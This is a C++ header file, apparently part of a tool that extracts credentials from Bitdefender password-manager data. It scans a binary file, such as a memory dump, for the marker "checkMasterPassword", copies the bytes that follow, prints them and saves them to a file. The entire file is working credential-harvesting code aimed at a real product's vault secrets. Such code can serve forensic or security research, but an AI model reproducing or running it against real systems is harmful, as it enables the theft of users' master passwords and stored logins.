#pragma once
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include "../core/saveFile.h"

//Check when the vault is first unlocked and then locked
int getCredsbitdefender2(std::string filename) {
    std::ifstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        std::cerr << "Error opening the file." << std::endl;
        return 1;
    }

    std::string searchKeyword = "\"checkMasterPassword\"";
    std::string foundData;

    while (!file.eof()) {
        char c;
        file.get(c);

        if (c == searchKeyword[foundData.size()]) {
            foundData += c;
            if (foundData == searchKeyword) {
                // We found the search keyword, now collect data until 2 binary spaces (00) are found
                std::vector<unsigned char> extractedData;
                int consecutiveSpaces = 0;

                while (!file.eof()) {
                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
                    if (c == 0x00) {
                        consecutiveSpaces++;
                        if (consecutiveSpaces == 2) {
                            break; // 2 consecutive binary spaces found
                            // We can check for more spaces if we want
                        }
                    }
                    else {
                        consecutiveSpaces = 0;
                    }
                    extractedData.push_back(c);
                }

                // Convert the binary data to a UTF-8 string
                std::string utf8ExtractedData(extractedData.begin(), extractedData.end());

                // Print the extracted UTF-8 string
                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;

                //Save into file
                saveFile(utf8ExtractedData);

                foundData.clear();
            }
        }
        else {
            foundData.clear();
        }
    }

    file.close();
    return 0;
}
